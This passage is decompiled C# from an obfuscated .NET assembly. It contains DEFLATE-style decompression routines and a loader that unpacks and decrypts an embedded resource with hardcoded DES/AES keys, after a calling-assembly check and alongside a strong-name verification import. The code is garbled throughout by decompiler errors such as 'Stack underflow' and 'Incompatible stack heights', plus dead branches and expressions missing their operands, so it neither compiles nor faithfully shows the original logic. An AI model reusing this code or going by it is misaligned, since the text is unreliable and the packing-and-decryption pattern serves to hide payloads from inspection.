								0, 0, 0, 0, 0, 0, 0, 0, 1, 1,
								1, 1, 2, 2, 2, 2, 3, 3, 3, 3,
								4, 4, 4, 4, 5, 5, 5, 5, 0
							};
							global::_0004._0005._0001._0002 = (int[])/*Error near IL_002b: Stack underflow*/;
							if (1 == 0)
							{
								continue;
							}
							goto IL_002e;
						}
						goto IL_0059;
						IL_0042:
						num = 30;
						if (num == 0)
						{
							continue;
						}
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0004._0005._0001._0004 = (int[])/*Error near IL_0059: Stack underflow*/;
						goto IL_0059;
						IL_002e:
						_ = new int[30]
						{
							1, 2, 3, 4, 5, 7, 9, 13, 17, 25,
							33, 49, 65, 97, 129, 193, 257, 385, 513, 769,
							1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577
						};
						global::_0004._0005._0001._0003 = (int[])/*Error near IL_0042: Stack underflow*/;
						goto IL_0042;
						IL_0059:
						if (false)
						{
							break;
						}
						if (0 == 0)
						{
							return;
						}
						goto IL_0042;
					}
				}
			}
		}

		internal sealed class _0002
		{
			internal byte[] _0001;

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;
		}

		internal sealed class _0003
		{
			internal byte[] _0001 = new byte[32768];

			internal int _0001;

			internal int _0002;
		}

		internal sealed class _0004
		{
			internal short[] _0001;

			public static readonly _0004 _0001;

			public static readonly _0004 _0002;

			static _0004()
			{
				//IL_003c: Invalid comparison between Unknown and I4
				//IL_0061: Invalid comparison between Unknown and I4
				//IL_00ce: Incompatible stack heights: 0 vs 1
				//IL_00d4: Incompatible stack heights: 0 vs 1
				//IL_00da: Incompatible stack heights: 0 vs 1
				//IL_00e0: Incompatible stack heights: 0 vs 1
				//IL_00e6: Incompatible stack heights: 0 vs 1
				//IL_00ec: Incompatible stack heights: 0 vs 1
				//IL_00f2: Incompatible stack heights: 0 vs 1
				byte[] array = new byte[288];
				int num = default(int);
				while (true)
				{
					IL_000f:
					if (0 == 0)
					{
						if (0 == 0)
						{
							num = 0;
						}
						if (-1 == 0)
						{
							goto IL_0086;
						}
						while ((int)/*Error near IL_003e: Stack underflow*/ < 144)
						{
							num++;
							((sbyte[])/*Error near IL_0032: Stack underflow*/)[/*Error near IL_0032: Stack underflow*/] = 8;
						}
						if (true)
						{
							while ((int)/*Error near IL_0063: Stack underflow*/ < 256)
							{
								if (false)
								{
									goto IL_000f;
								}
								num++;
								((sbyte[])/*Error near IL_0057: Stack underflow*/)[/*Error near IL_0057: Stack underflow*/] = 9;
							}
							goto IL_0071;
						}
					}
					goto IL_00a1;
					IL_0071:
					int num2;
					int num3;
					while (true)
					{
						num2 = num;
						num3 = 280;
						if (num3 == 0)
						{
							break;
						}
						if (num2 < num3)
						{
							int num4 = num++;
							((sbyte[])/*Error near IL_0071: Stack underflow*/)[num4] = 7;
							continue;
						}
						goto IL_0086;
					}
					goto IL_00b0;
					IL_00ad:
					num2 = num;
					num3 = 32;
					goto IL_00b0;
					IL_00a1:
					num = 0;
					goto IL_00ad;
					IL_00b0:
					if (num2 >= num3)
					{
						if (8u != 0)
						{
							break;
						}
						goto IL_0071;
					}
					array[num++] = 5;
					goto IL_00ad;
					IL_0086:
					while (num < 288)
					{
						array[num++] = 8;
					}
					_0001 = new _0004(array);
					array = new byte[32];
					goto IL_00a1;
				}
				_0002 = new _0004(array);
			}

			public _0004(byte[] P_0)
			{
				global::_0001._0003._0001(this, P_0);
			}
		}

		internal sealed class _0005
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal byte[] _0001;

			internal byte[] _0002;

			internal _0004 _0001;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal int _0006;

			internal byte _0001;

			internal int _0007;

			internal static readonly int[] _0003;

			static _0005()
			{
				//IL_004c: Incompatible stack heights: 0 vs 1
				//IL_0053: Incompatible stack heights: 0 vs 1
				//IL_005a: Incompatible stack heights: 0 vs 1
				while (true)
				{
					int num = 3;
					while (true)
					{
						IL_0001:
						RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
						global::_0004._0005._0005._0001 = (int[])/*Error near IL_0013: Stack underflow*/;
						while (0 == 0)
						{
							num = 3;
							if (num != 0)
							{
								RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
								global::_0004._0005._0005._0002 = (int[])/*Error near IL_002c: Stack underflow*/;
								if (false)
								{
									continue;
								}
								num = 19;
							}
							if (num != 0)
							{
								RuntimeHelpers.InitializeArray(new int[num], (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/);
								_0003 = (int[])/*Error near IL_0046: Stack underflow*/;
								return;
							}
							goto IL_0001;
						}
						break;
					}
				}
			}
		}

		internal sealed class _0006
		{
			private static readonly int[] _0001;

			internal static readonly byte[] _0001;

			private static readonly short[] _0001;

			private static readonly byte[] _0002;

			private static readonly short[] _0002;

			private static readonly byte[] _0003;

			static _0006()
			{
				//IL_0068: Unknown result type (might be due to invalid IL or missing references)
				//IL_006a: Unknown result type (might be due to invalid IL or missing references)
				//IL_008e: Invalid comparison between Unknown and I4
				//IL_0175: Incompatible stack heights: 0 vs 1
				//IL_017f: Incompatible stack heights: 0 vs 1
				//IL_018b: Incompatible stack heights: 0 vs 2
				//IL_0191: Incompatible stack heights: 0 vs 2
				//IL_019b: Expected I4, but got Unknown
				//IL_019b: Incompatible stack heights: 0 vs 1
				//IL_01a1: Incompatible stack heights: 0 vs 2
				//IL_01a7: Incompatible stack heights: 0 vs 1
				//IL_01ad: Incompatible stack heights: 0 vs 2
				while (true)
				{
					_ = new int[19]
					{
						16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
						11, 4, 12, 3, 13, 2, 14, 1, 15
					};
					_0006._0001 = (int[])/*Error near IL_0017: Stack underflow*/;
					while (true)
					{
						IL_0017:
						_ = new byte[16]
						{
							0, 8, 4, 12, 2, 10, 6, 14, 1, 9,
							5, 13, 3, 11, 7, 15
						};
						_0006._0001 = (byte[])/*Error near IL_002e: Stack underflow*/;
						_0001 = new short[286];
						_0006._0002 = new byte[286];
						int num;
						if (0 == 0)
						{
							num = 0;
							goto IL_0089;
						}
						goto IL_00ab;
						IL_0089:
						if ((int)/*Error near IL_0090: Stack underflow*/ < 144)
						{
							_ = _0001;
							_ = 48;
							global::_0001._0003._0001(/*Error near IL_0069: Stack underflow*/ + /*Error near IL_0069: Stack underflow*/<< 8);
							((short[])/*Error near IL_0071: Stack underflow*/)[/*Error near IL_0071: Stack underflow*/] = (short)/*Error near IL_0071: Stack underflow*/;
							goto IL_0071;
						}
						goto IL_00b8;
						IL_00ab:
						_0006._0002[num++] = 9;
						goto IL_00b8;
						IL_00b8:
						if (num < 256)
						{
							_ = _0001;
							short num2 = global::_0001._0003._0001(256 + num << 7);
							((short[])/*Error near IL_00ab: Stack underflow*/)[/*Error near IL_00ab: Stack underflow*/] = num2;
							goto IL_00ab;
						}
						if (false)
						{
							break;
						}
						while (true)
						{
							int num3 = num;
							while (num3 >= 280)
							{
								while (num < 286)
								{
									_0001[num] = global::_0001._0003._0001(-88 + num << 8);
									_0006._0002[num++] = 8;
								}
								_0002 = new short[30];
								_0003 = new byte[30];
								if (false)
								{
									goto end_IL_00f0;
								}
								num = 0;
								while (true)
								{
									if (num < 30)
									{
										_0002[num] = global::_0001._0003._0001(num << 11);
										if (2 == 0)
										{
											break;
										}
										_0003[num] = 5;
										num3 = num;
										if (3 == 0)
										{
											goto IL_00f1;
										}
										num = num3 + 1;
										continue;
									}
									return;
								}
								goto IL_0017;
								IL_00f1:;
							}
							_0001[num] = global::_0001._0003._0001(-256 + num << 9);
							if (7 == 0)
							{
								goto end_IL_0017;
							}
							_0006._0002[num++] = 7;
							continue;
							end_IL_00f0:
							break;
						}
						goto IL_0071;
						IL_0071:
						if (0 == 0)
						{
							_ = _0006._0002;
							num++;
							((sbyte[])/*Error near IL_0084: Stack underflow*/)[/*Error near IL_0084: Stack underflow*/] = 8;
							goto IL_0089;
						}
						goto IL_00b8;
						continue;
						end_IL_0017:
						break;
					}
				}
			}
		}

		internal sealed class _0007 : MemoryStream
		{
			public _0007(byte[] P_0)
				: base(P_0, writable: false)
			{
			}
		}
	}
}
namespace _0001
{
	internal sealed class _0003
	{
		unsafe static bool _0001(_0004._0005._0001 P_0)
		{
			//IL_0211: Incompatible stack heights: 0 vs 1
			//IL_021b: Incompatible stack heights: 0 vs 1
			//IL_0227: Incompatible stack heights: 0 vs 1
			//IL_022d: Incompatible stack heights: 0 vs 1
			//IL_0233: Incompatible stack heights: 0 vs 1
			//IL_0239: Incompatible stack heights: 0 vs 1
			//IL_023f: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[12];
			while (true)
			{
				_0003._0001(((_0004._0005._0001)/*Error near IL_0014: Stack underflow*/)._0001);
				int num = (int)/*Error near IL_0221: Stack underflow*/;
				while (true)
				{
					IL_01fd:
					int num2 = num;
					int num3 = 258;
					while (true)
					{
						int num5;
						if (num2 >= num3)
						{
							int num4 = ((_0004._0005._0001)/*Error near IL_0032: Stack underflow*/)._0001;
							*(int*)(nint)/*Error near IL_0033: Stack underflow*/ = num4;
							int num6;
							int num7;
							switch (*(int*)(nint)/*Error near IL_0039: Stack underflow*/)
							{
							case 7:
								while (((num5 = _0003._0001(P_0._0001, P_0._0001)) & -256) == 0)
								{
									if (6u != 0)
									{
										_ = ((_0004._0005._0001)/*Error near IL_0062: Stack underflow*/)._0001;
										_0003._0001((_0004._0005._0003)/*Error near IL_006c: Stack underflow*/, (int)/*Error near IL_006c: Stack underflow*/);
										if (--num >= 258)
										{
											continue;
										}
									}
									goto IL_0078;
								}
								if (num5 < 257)
								{
									goto IL_00a3;
								}
								goto IL_00c6;
							case 8:
								if (P_0._0002 > 0)
								{
									P_0._0001 = 8;
									*(int*)((byte*)ptr + 4) = _0003._0001(P_0._0001, P_0._0002);
									if (*(int*)((byte*)ptr + 4) < 0)
									{
										return false;
									}
									if (false)
									{
										goto IL_00c6;
									}
									_0003._0001(P_0._0001, P_0._0002);
									P_0._0003 += *(int*)((byte*)ptr + 4);
								}
								P_0._0001 = 9;
								goto case 9;
							case 9:
								if (false)
								{
									goto end_IL_0203;
								}
								num5 = _0003._0001(P_0._0002, P_0._0001);
								if (num5 < 0)
								{
									goto IL_0163;
								}
								P_0._0004 = _0004._0005._0001._0003[num5];
								P_0._0002 = _0004._0005._0001._0004[num5];
								goto case 10;
							case 10:
								{
									num6 = P_0._0002;
									num7 = 0;
									goto IL_0186;
								}
								IL_01d3:
								_0003._0001(P_0._0001, P_0._0003, P_0._0004);
								num6 = num - P_0._0003;
								if (6u != 0)
								{
									num = num6;
									P_0._0001 = 7;
									break;
								}
								goto IL_01a9;
								IL_00c6:
								P_0._0003 = _0004._0005._0001._0001[num5 - 257];
								P_0._0002 = _0004._0005._0001._0002[num5 - 257];
								goto case 8;
								IL_0078:
								if (5u != 0)
								{
									return true;
								}
								goto IL_01a5;
								IL_0186:
								if (num6 > num7)
								{
									P_0._0001 = 10;
									*(int*)((byte*)ptr + 8) = _0003._0001(P_0._0001, P_0._0002);
									goto IL_01a5;
								}
								goto IL_01d3;
								IL_01a5:
								num6 = *(int*)((byte*)ptr + 8);
								goto IL_01a9;
								IL_01a9:
								num7 = 0;
								if (num7 != 0)
								{
									goto IL_0186;
								}
								if (num6 < num7)
								{
									return false;
								}
								_0003._0001(P_0._0001, P_0._0002);
								P_0._0004 += *(int*)((byte*)ptr + 8);
								goto IL_01d3;
							}
							goto IL_01fd;
						}
						return true;
						IL_00a3:
						num2 = num5;
						num3 = 0;
						if (num3 != 0)
						{
							continue;
						}
						goto IL_00ab;
						IL_0163:
						return false;
						continue;
						end_IL_0203:
						break;
					}
					break;
					IL_00ab:
					if (num2 < num3)
					{
						return false;
					}
					P_0._0002 = null;
					P_0._0001 = null;
					P_0._0001 = 2;
					return true;
				}
			}
		}

		static byte[] _0001(string P_0, byte[] P_1)
		{
			//IL_001a: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			new RSACryptoServiceProvider().ExportParameters(includePrivateParameters: false);
			/*Error near IL_000a: Stack underflow*/;
			((AsymmetricAlgorithm)/*Error near IL_0024: Stack underflow*/).FromXmlString((string)/*Error near IL_0024: Stack underflow*/);
			((RSACryptoServiceProvider)/*Error near IL_002e: Stack underflow*/).Encrypt((byte[])/*Error near IL_002e: Stack underflow*/, fOAEP: true);
			return (byte[])/*Error near IL_0015: Stack underflow*/;
		}

		static void _0001(_0004._0005._0002 P_0, int P_1)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I4, but got Unknown
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Expected I4, but got Unknown
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 2
			while (true)
			{
				_ = ((_0004._0005._0002)/*Error near IL_0009: Stack underflow*/)._0001;
				_003F val = /*Error near IL_000e: Stack underflow*/& 0x1F;
				_003F val2 = /*Error near IL_000f: Stack underflow*/>> (int)val;
				((_0004._0005._0002)/*Error near IL_0014: Stack underflow*/)._0001 = (uint)(int)val2;
				while (0 == 0)
				{
					_ = ((_0004._0005._0002)/*Error near IL_0020: Stack underflow*/)._0003;
					_003F val3 = /*Error near IL_0023: Stack underflow*/- /*Error near IL_0023: Stack underflow*/;
					((_0004._0005._0002)/*Error near IL_0028: Stack underflow*/)._0003 = (int)val3;
					if (8u != 0)
					{
						return;
					}
				}
			}
		}

		unsafe static void _0001(_0004._0005._0004 P_0, byte[] P_1)
		{
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0312: Incompatible stack heights: 0 vs 1
			//IL_0318: Incompatible stack heights: 0 vs 1
			//IL_031e: Incompatible stack heights: 0 vs 2
			//IL_0324: Incompatible stack heights: 0 vs 1
			//IL_032a: Incompatible stack heights: 0 vs 1
			//IL_0330: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[64];
			int[] array = new int[16];
			int[] array2 = new int[16];
			*(int*)(nint)(/*Error near IL_002a: Stack underflow*/ + 12) = 0;
			while (*(int*)((byte*)ptr + 12) < P_1.Length)
			{
				_ = /*Error near IL_0036: Stack underflow*/+ 16;
				int num = *(int*)(nint)(/*Error near IL_0043: Stack underflow*/ + 12);
				byte num2 = ((byte[])/*Error near IL_0045: Stack underflow*/)[num];
				*(int*)(nint)/*Error near IL_0046: Stack underflow*/ = num2;
				if (*(int*)(nint)(/*Error near IL_004e: Stack underflow*/ + 16) > 0)
				{
					int num3 = *(int*)((byte*)ptr + 16);
					((int[])/*Error near IL_005d: Stack underflow*/)[num3]++;
				}
				(*(int*)((byte*)ptr + 12))++;
			}
			*(int*)ptr = 0;
			*(int*)((byte*)ptr + 4) = 512;
			*(int*)((byte*)ptr + 20) = 1;
			while (*(int*)((byte*)ptr + 20) <= 15)
			{
				array2[*(int*)((byte*)ptr + 20)] = *(int*)ptr;
				*(int*)ptr += array[*(int*)((byte*)ptr + 20)] << 16 - *(int*)((byte*)ptr + 20);
				if (*(int*)((byte*)ptr + 20) >= 10)
				{
					*(int*)((byte*)ptr + 24) = array2[*(int*)((byte*)ptr + 20)] & 0x1FF80;
					*(int*)((byte*)ptr + 28) = *(int*)ptr & 0x1FF80;
					*(int*)((byte*)ptr + 4) += *(int*)((byte*)ptr + 28) - *(int*)((byte*)ptr + 24) >> 16 - *(int*)((byte*)ptr + 20);
				}
				(*(int*)((byte*)ptr + 20))++;
			}
			P_0._0001 = new short[*(int*)((byte*)ptr + 4)];
			*(int*)((byte*)ptr + 8) = 512;
			*(int*)((byte*)ptr + 32) = 15;
			while (*(int*)((byte*)ptr + 32) >= 10)
			{
				*(int*)((byte*)ptr + 36) = *(int*)ptr & 0x1FF80;
				*(int*)ptr -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
				*(int*)((byte*)ptr + 40) = *(int*)ptr & 0x1FF80;
				while (*(int*)((byte*)ptr + 40) < *(int*)((byte*)ptr + 36))
				{
					P_0._0001[_0003._0001(*(int*)((byte*)ptr + 40))] = (short)((-(*(int*)((byte*)ptr + 8)) << 4) | *(int*)((byte*)ptr + 32));
					*(int*)((byte*)ptr + 8) += 1 << *(int*)((byte*)ptr + 32) - 9;
					*(int*)((byte*)ptr + 40) += 128;
				}
				(*(int*)((byte*)ptr + 32))--;
			}
			*(int*)((byte*)ptr + 44) = 0;
			while (*(int*)((byte*)ptr + 44) < P_1.Length)
			{
				*(int*)((byte*)ptr + 48) = P_1[*(int*)((byte*)ptr + 44)];
				if (*(int*)((byte*)ptr + 48) != 0)
				{
					*(int*)ptr = array2[*(int*)((byte*)ptr + 48)];
					do
					{
						*(int*)((byte*)ptr + 52) = _0003._0001(*(int*)ptr);
						if (*(int*)((byte*)ptr + 48) <= 9)
						{
							do
							{
								P_0._0001[*(int*)((byte*)ptr + 52)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
								*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
							}
							while (*(int*)((byte*)ptr + 52) < 512);
							continue;
						}
						*(int*)((byte*)ptr + 56) = P_0._0001[*(int*)((byte*)ptr + 52) & 0x1FF];
						*(int*)((byte*)ptr + 60) = 1 << (*(int*)((byte*)ptr + 56) & 0xF);
						*(int*)((byte*)ptr + 56) = -(*(int*)((byte*)ptr + 56) >> 4);
						do
						{
							P_0._0001[*(int*)((byte*)ptr + 56) | (*(int*)((byte*)ptr + 52) >> 9)] = (short)((*(int*)((byte*)ptr + 44) << 4) | *(int*)((byte*)ptr + 48));
							*(int*)((byte*)ptr + 52) += 1 << *(int*)((byte*)ptr + 48);
						}
						while (*(int*)((byte*)ptr + 52) < *(int*)((byte*)ptr + 60));
					}
					while (false);
					array2[*(int*)((byte*)ptr + 48)] = *(int*)ptr + (1 << 16 - *(int*)((byte*)ptr + 48));
				}
				(*(int*)((byte*)ptr + 44))++;
			}
		}

		static DirectoryInfo[] _0001(string P_0)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			try
			{
				if (true)
				{
					new DirectoryInfo((string)/*Error near IL_0015: Stack underflow*/);
					((DirectoryInfo)/*Error near IL_001c: Stack underflow*/).GetDirectories();
					DirectoryInfo[] array = (DirectoryInfo[])/*Error near IL_001f: Stack underflow*/;
				}
			}
			catch (Exception)
			{
				DirectoryInfo[] array = null;
			}
			return (DirectoryInfo[])/*Error near IL_0029: Stack underflow*/;
		}

		static int _0001(_0004._0005._0007 P_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Expected I4, but got Unknown
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			((Stream)/*Error near IL_0014: Stack underflow*/).ReadByte();
			((Stream)/*Error near IL_001e: Stack underflow*/).ReadByte();
			_003F val = /*Error near IL_000a: Stack underflow*/<< 8;
			return /*Error near IL_000b: Stack underflow*/| val;
		}

		static int _0001(_0004._0005._0002 P_0, int P_1)
		{
			//IL_0028: Invalid comparison between Unknown and I4
			//IL_009c: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a2: Expected I4, but got Unknown
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 2
			//IL_00da: Incompatible stack heights: 0 vs 1
			//IL_00e0: Incompatible stack heights: 0 vs 2
			//IL_00e6: Incompatible stack heights: 0 vs 1
			//IL_00ec: Incompatible stack heights: 0 vs 1
			//IL_00f2: Incompatible stack heights: 0 vs 2
			//IL_00f8: Incompatible stack heights: 0 vs 2
			//IL_00fe: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = ((_0004._0005._0002)/*Error near IL_000a: Stack underflow*/)._0003;
				if (/*Error near IL_0014: Stack underflow*/ >= /*Error near IL_0014: Stack underflow*/)
				{
					break;
				}
				_ = ((_0004._0005._0002)/*Error near IL_001e: Stack underflow*/)._0001;
				int num = ((_0004._0005._0002)/*Error near IL_0028: Stack underflow*/)._0002;
				if ((int)/*Error near IL_002a: Stack underflow*/ == num)
				{
					if (false)
					{
						break;
					}
					if (true)
					{
						return -1;
					}
				}
				else
				{
					if (7 == 0)
					{
						continue;
					}
					_ = ((_0004._0005._0002)/*Error near IL_0047: Stack underflow*/)._0001;
					_ = ((_0004._0005._0002)/*Error near IL_0051: Stack underflow*/)._0001;
					int num2 = ((_0004._0005._0002)/*Error near IL_0060: Stack underflow*/)._0001;
					((_0004._0005._0002)/*Error near IL_0069: Stack underflow*/)._0001 = num2 + 1;
					int num3 = (((byte[])/*Error near IL_006b: Stack underflow*/)[num2] & 0xFF) | ((P_0._0001[P_0._0001++] & 0xFF) << 8);
					int num4 = P_0._0003;
					_003F val = /*Error near IL_009d: Stack underflow*/| (num3 << num4);
					((_0004._0005._0002)/*Error near IL_00a2: Stack underflow*/)._0001 = (uint)(int)val;
				}
				P_0._0003 += 16;
				break;
			}
			long num5 = P_0._0001;
			int num6 = 1;
			while (true)
			{
				int num7;
				if (0 == 0)
				{
					num6 <<= P_1;
					if (false)
					{
						break;
					}
				}
				else if (num7 == 0)
				{
					continue;
				}
				num6--;
				break;
			}
			return (int)(num5 & num6);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_0004._0005._0003 P_0, int P_1)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected I4, but got Unknown
			//IL_0027: Invalid comparison between Unknown and I4
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_007b: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_008e: Incompatible stack heights: 0 vs 2
			//IL_0091: Incompatible stack heights: 0 vs 1
			while (true)
			{
				int num = ((_0004._0005._0003)/*Error near IL_000c: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0018: Stack underflow*/+ 1;
				((_0004._0005._0003)/*Error near IL_001d: Stack underflow*/)._0002 = (int)val;
				while (0 == 0)
				{
					if ((int)/*Error near IL_0029: Stack underflow*/ != 32768)
					{
						if (8 == 0)
						{
							break;
						}
						_ = ((_0004._0005._0003)/*Error near IL_0039: Stack underflow*/)._0001;
						num = ((_0004._0005._0003)/*Error near IL_0042: Stack underflow*/)._0001;
						((_0004._0005._0003)/*Error near IL_004b: Stack underflow*/)._0001 = num + 1;
						((sbyte[])/*Error near IL_004f: Stack underflow*/)[num] = (sbyte)(byte)P_1;
						if (0 == 0)
						{
							if (0 == 0)
							{
								P_0._0001 &= 32767;
								return;
							}
							continue;
						}
					}
					if (8 == 0)
					{
						break;
					}
					new InvalidOperationException();
					throw /*Error near IL_002f: Stack underflow*/;
				}
			}
		}

		unsafe static byte[] _0001(byte[] P_0)
		{
			//IL_0320: Incompatible stack heights: 0 vs 1
			//IL_0330: Incompatible stack heights: 0 vs 1
			//IL_033c: Incompatible stack heights: 0 vs 1
			//IL_0342: Incompatible stack heights: 0 vs 1
			//IL_0348: Incompatible stack heights: 0 vs 1
			//IL_034e: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[46];
			Assembly.GetCallingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_0326: Stack underflow*/;
			Assembly.GetExecutingAssembly();
			Assembly assembly2 = (Assembly)/*Error near IL_0336: Stack underflow*/;
			if (/*Error near IL_002a: Stack underflow*/ != /*Error near IL_002a: Stack underflow*/&& !_0003._0001((Assembly)/*Error near IL_0039: Stack underflow*/, (Assembly)/*Error near IL_0039: Stack underflow*/))
			{
				return null;
			}
			_0004._0005._0007 obj = new _0004._0005._0007(P_0);
			byte[] array = new byte[0];
			*(int*)ptr = _0003._0001(obj);
			int num = *(int*)ptr;
			if (6 == 0)
			{
				goto IL_0226;
			}
			if (num == 67324752)
			{
				*(short*)((byte*)ptr + 44) = (short)_0003._0001(obj);
				*(int*)((byte*)ptr + 4) = _0003._0001(obj);
				*(int*)((byte*)ptr + 8) = _0003._0001(obj);
				if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
				{
					throw new FormatException("Wrong Header Signature");
				}
				num = _0003._0001(obj);
				if (2 == 0)
				{
					goto IL_0226;
				}
				_0003._0001(obj);
				_0003._0001(obj);
				*(int*)((byte*)ptr + 12) = _0003._0001(obj);
				*(int*)((byte*)ptr + 16) = _0003._0001(obj);
				*(int*)((byte*)ptr + 20) = _0003._0001(obj);
				if (*(int*)((byte*)ptr + 16) > 0)
				{
					byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
					obj.Read(buffer, 0, *(int*)((byte*)ptr + 16));
				}
				if (*(int*)((byte*)ptr + 20) > 0)
				{
					byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
					if (-1 == 0)
					{
						goto IL_02bc;
					}
					obj.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
				}
			}
			else
			{
				*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
				*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
				if (*(int*)ptr != 8223355)
				{
					throw new FormatException("Unknown Header");
				}
				if (*(int*)((byte*)ptr + 24) != 1)
				{
					goto IL_0243;
				}
				if (0 == 0)
				{
					*(int*)((byte*)ptr + 28) = _0003._0001(obj);
					array = new byte[*(int*)((byte*)ptr + 28)];
					*(int*)((byte*)ptr + 32) = 0;
					goto IL_0237;
				}
			}
			byte[] array2 = new byte[obj.Length - obj.Position];
			obj.Read(array2, 0, array2.Length);
			_0004._0005._0001 obj2 = new _0004._0005._0001(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			_0004._0005._0001 obj3 = obj2;
			byte[] array3 = array;
			*(int*)((byte*)ptr + 40) = array.Length;
			_0003._0001(array3, obj3, *(int*)((byte*)ptr + 40), 0);
			array2 = null;
			goto IL_030a;
			IL_0243:
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] array4 = new byte[8] { 198, 93, 36, 77, 34, 181, 226, 129 };
				byte[] array5 = new byte[8] { 207, 49, 172, 0, 74, 49, 167, 141 };
				using ICryptoTransform cryptoTransform = _0003._0001(true, array5, array4);
				array = _0003._0001(cryptoTransform.TransformFinalBlock(P_0, 4, P_0.Length - 4));
			}
			byte[] array6 = default(byte[]);
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				array6 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				goto IL_02bc;
			}
			goto IL_030a;
			IL_02bc:
			byte[] array7 = new byte[16]
			{
				2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
				2, 2, 2, 2, 2, 2
			};
			using (ICryptoTransform cryptoTransform2 = _0003._0001(array7, array6, true))
			{
				array = _0003._0001(cryptoTransform2.TransformFinalBlock(P_0, 4, P_0.Length - 4));
			}
			goto IL_030a;
			IL_0226:
			*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 36);
			goto IL_0237;
			IL_0237:
			if (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
			{
				int num2 = _0003._0001(obj);
				*(int*)((byte*)ptr + 36) = _0003._0001(obj);
				byte[] array8 = new byte[num2];
				obj.Read(array8, 0, array8.Length);
				num = _0003._0001(array, new _0004._0005._0001(array8), *(int*)((byte*)ptr + 36), *(int*)((byte*)ptr + 32));
				goto IL_0226;
			}
			goto IL_0243;
			IL_030a:
			obj.Close();
			obj = null;
			return array;
		}

		unsafe static int _0001(_0004._0005._0004 P_0, _0004._0005._0002 P_1)
		{
			//IL_0023: Invalid comparison between Unknown and I4
			//IL_003f: Invalid comparison between Unknown and I4
			//IL_0050: Unknown result type (might be due to invalid IL or missing references)
			//IL_0121: Incompatible stack heights: 0 vs 1
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_012d: Incompatible stack heights: 0 vs 1
			//IL_0133: Incompatible stack heights: 0 vs 2
			//IL_0139: Incompatible stack heights: 0 vs 1
			//IL_013f: Incompatible stack heights: 0 vs 1
			//IL_0145: Incompatible stack heights: 0 vs 1
			//IL_014f: Expected I4, but got Unknown
			void* ptr;
